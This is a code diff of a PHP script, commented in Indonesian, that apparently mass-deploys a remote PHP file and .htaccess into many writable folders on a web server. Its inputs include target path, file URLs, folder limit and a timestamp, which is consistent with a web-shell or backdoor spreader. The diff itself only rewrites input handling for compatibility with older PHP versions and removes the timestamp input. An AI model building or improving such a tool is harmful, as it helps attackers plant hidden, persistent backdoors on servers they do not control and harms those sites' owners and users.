@@ -105,13 +105,12 @@ function findAllWritableFolders($dir) {
     if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         echo "<h3>Memulai Proses Deployment...</h3>";
 
-        // Ambil dan validasi input
-        $target = rtrim($_POST['target_path'] ?? '', '/');
-        $phpUrl = $_POST['php_url'] ?? '';
-        $htaccessUrl = $_POST['htaccess_url'] ?? '';
-        $phpName = basename($_POST['php_name'] ?? 'index.php');
-        $limit = max(1, min(50, intval($_POST['folder_limit'] ?? 5)));
-        $timestamp = !empty($_POST['timestamp']) ? strtotime($_POST['timestamp']) : false;
+        // Ambil dan validasi input (Kompatibel dengan PHP versi lama)
+        $target = rtrim(isset($_POST['target_path']) ? $_POST['target_path'] : '', '/');
+        $phpUrl = isset($_POST['php_url']) ? $_POST['php_url'] : '';
+        $htaccessUrl = isset($_POST['htaccess_url']) ? $_POST['htaccess_url'] : '';
+        $phpName = basename(isset($_POST['php_name']) ? $_POST['php_name'] : 'index.php');
+        $limit = max(1, min(50, intval(isset($_POST['folder_limit']) ? $_POST['folder_limit'] : 5)));
 
         // Validasi awal
         if (!is_dir($target)) {
